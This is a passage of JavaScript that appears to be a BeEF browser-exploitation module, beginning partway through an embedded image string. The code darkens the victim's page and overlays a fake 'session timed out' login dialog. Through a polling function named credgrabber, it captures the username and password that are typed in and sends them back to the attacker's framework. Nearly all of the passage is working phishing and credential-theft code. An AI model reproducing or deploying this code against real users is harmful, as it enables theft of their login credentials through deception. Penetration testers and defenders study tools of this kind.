JaPq164g+XXL6M5s7X376AZ5+8RlhEVmJuFtz85DPjeRsN1Y+kXGOo1jTMxDcKBAff/IB/vvRO6XG+TZvi0Ti5SvQ1X7V4BZaQ6EMlomW20QCpDqidM+gTf79wmWlHmA0euHTOf9C5JblePyZR9G+Yzu4Eydh8PB/DLAGDRpg2F1D8f6H/8LByLV47qlZpXKJHJMJ/5n3Rc1iKxXLcShN8Jj8/Cq3h5Sa3IrZi/O21tPTZ+mKtVi+egMmjR1V6oH9+/QQy5SbiysJV5GcfI2HwQivVEijIAQE+ENXQTrKK3//N/ZG7oHex7s2zgNXy71La66DW0mRUlOAcJj7B61W87TNYsPvX/gbwps0Ro9unct8AY9HbtWimViVlby8PPzptXcwd+58aI3G2jgHDHSe535WbgcpzjSxWLixV5Lew4CE+ASMGv8AFi9d5bQPt/fAYQwfdz/mfvgpdGSaabVONa3Ys/AUlJwyCQ4ptQIQjiL/iUm43ssD11JSMOOhpzB6ysPYsj0KFou1ym/IjRE2btmJqfQ+g4dPRNSOXdD7+ji7Dy93AOdGB/+TW0BKbZlYDvkenHpix3vc4I1jFetXrcfmjdvQoVMH3D1yCPr17i4i4GEhjUSHcg72cRSeV2pquhgbcOZcLHbtO4htO3fjXMw52IijaOlYvZens7/zt7SeUzWIFCm1DhCW91VyO1uj0bjpjUYx1vjYkeM4RpseBBwvP18YVXAEBzYUCY3cPocDf5lZ2bBkqPuVjtUa3KA31EpNNmfVvi0vu5S6BgjLXNV04d6wfZgvaD3cOQ1XaBWTyYQc0U/KjiukMTjJUQnDK717a8k7VcD1ofSR+lZecik3CyAsPGmI69Q5vZc7fnOddRDHLcRwGUeZhludduzg3ko8inq1vNxSbjZAHHfrFepyjEfgUdBcXsr5TI3q8Ptxli3Xe6+Tl1qKqwCksHCbyI3qYmlI615af6XVpA40hwSHlBpJXRdvcxYw9/Lto2qY2pJMFYgSHFLqFUAcwmWpk2m9AOe7W7maj1vprJWXV0p9BQgLF4p8DCVgt9FJ78nJhjxUdIO8tFLqO0Acwk0NxqhEntv5X67Ge3CyIRc1sQftiLysUuoLSa+scHHSTnVx/W53dbNz5mNLKJNUvXFj8Ai3xucCJu5MyN1DVsN1ZutJuYXk/wUYAC5gaikMXNI2AAAAAElFTkSuQmCC';
	var answer= '';
	
	beef.dom.createIframe('fullscreen', {'src':$j(this).attr('href')}, {}, null);
	$j(document).attr('title', $j(this).html());
	document.body.scroll = 'no';
	document.documentElement.style.overflow = 'hidden';
	
	// set up darkening
	function grayOut(vis, options) {
	  // Pass true to gray out screen, false to ungray
	  // options are optional.  This is a JSON object with the following (optional) properties
	  // opacity:0-100         // Lower number = less grayout higher = more of a blackout 
	  // zindex: #             // HTML elements with a higher zindex appear on top of the gray out
	  // bgcolor: (#xxxxxx)    // Standard RGB Hex color code
	  // grayOut(true, {'zindex':'50', 'bgcolor':'#0000FF', 'opacity':'70'});
	  // Because options is JSON opacity/zindex/bgcolor are all optional and can appear
	  // in any order.  Pass only the properties you need to set.
	  var options = options || {};
	  var zindex = options.zindex || 50;
	  var opacity = options.opacity || 70;
	  var opaque = (opacity / 100);
	  var bgcolor = options.bgcolor || '#000000';
	  var dark=document.getElementById('darkenScreenObject');
	  if (!dark) {
	    // The dark layer doesn't exist, it's never been created.  So we'll
	    // create it here and apply some basic styles.
	    // If you are getting errors in IE see: http://support.microsoft.com/default.aspx/kb/927917
	    var tbody = document.getElementsByTagName("body")[0];
	    var tnode = document.createElement('div');           // Create the layer.
	        tnode.style.position='absolute';                 // Position absolutely
	        tnode.style.top='0px';                           // In the top
	        tnode.style.left='0px';                          // Left corner of the page
	        tnode.style.overflow='hidden';                   // Try to avoid making scroll bars            
	        tnode.style.display='none';                      // Start out Hidden
	        tnode.id='darkenScreenObject';                   // Name it so we can find it later
	    tbody.appendChild(tnode);                            // Add it to the web page
	    dark=document.getElementById('darkenScreenObject');  // Get the object.
	  }
	  if (vis) {
	    // Calculate the page width and height 
	    if( document.body && ( document.body.scrollWidth || document.body.scrollHeight ) ) {
	        var pageWidth = document.body.scrollWidth+'px';
	        var pageHeight = document.body.scrollHeight+'px';
	    } else if( document.body.offsetWidth ) {
	      var pageWidth = document.body.offsetWidth+'px';
	      var pageHeight = document.body.offsetHeight+'px';
	    } else {
	       var pageWidth='100%';
	       var pageHeight='100%';
	    }
	    //set the shader to cover the entire page and make it visible.
	    dark.style.opacity=opaque;
	    dark.style.MozOpacity=opaque;
	    dark.style.filter='alpha(opacity='+opacity+')';
	    dark.style.zIndex=zindex;
	    dark.style.backgroundColor=bgcolor;
	    dark.style.width= pageWidth;
	    dark.style.height= pageHeight;
	    dark.style.display='block';
	  } else {
	     dark.style.display='none';
	  }
	}

	// function to send response
	function win(){
		document.getElementById('hax').innerHtml='<h2>Thank you for re-authenticating, you will now be returned to the application</h2>';
		answer = document.getElementById('uname').value+':'+document.getElementById('pass').value;
	}

	// perform darkening
	grayOut(true);

	function checker(){
		processval = document.body.lastChild.getElementsByTagName("input")[2].value;
		if (processval == "Processing..") {
			uname = document.body.lastChild.getElementsByTagName("input")[0].value;
			pass = document.body.lastChild.getElementsByTagName("input")[1].value;
			answer = uname+":"+pass
  		send(answer);
			// set lastchild invisible
			document.body.lastChild.setAttribute('style','display:none');
			// lighten screen
			grayOut(false);
			clearInterval(credgrabber);
			$j('#hax').remove();
			$j('#darkenScreenObject').remove();
		}
	}


	// floating div
	function writeit() {
		sneakydiv = document.createElement('div');
		sneakydiv.setAttribute('id', 'hax');
		sneakydiv.setAttribute('style', 'width:400px;height:320px;position:absolute; top:30%; left:40%; z-index:51; background-color:ffffff;font-family:\'Arial\',Arial,sans-serif;border-width:thin;border-style:solid;border-color:#000000');
		sneakydiv.setAttribute('align', 'center');
		document.body.appendChild(sneakydiv);
		sneakydiv.innerHTML= '<br><img src=\''+imgr+'\' width=\'80px\' height\'80px\' /><h2>Your session has timed out!</h2><p>For your security, your session has been timed out. To continue browsing this site, please re-enter your username and password below.</p><table border=\'0\'><tr><td>Username:</td><td><input type=\'text\' name=\'uname\' id=\'uname\' value=\'\' onkeydown=\'if (event.keyCode == 13) document.getElementById(\"lul\").value=\"Processing..\";\'></input></td></td><tr><td>Password:</td><td><input type=\'password\' name=\'pass\' id=\'pass\' value=\'\' onkeydown=\'if (event.keyCode == 13) document.getElementById(\"lul\").value=\"Processing..\";\'></input></td></tr></table><br><input type=\'button\' name=\'lul\' id=\'lul\' onClick=\'document.getElementById(\"lul\").value=\"Processing..\";\' value=\'Continue\'>';
		credgrabber = setInterval(checker,1000);

	}
	
	writeit();
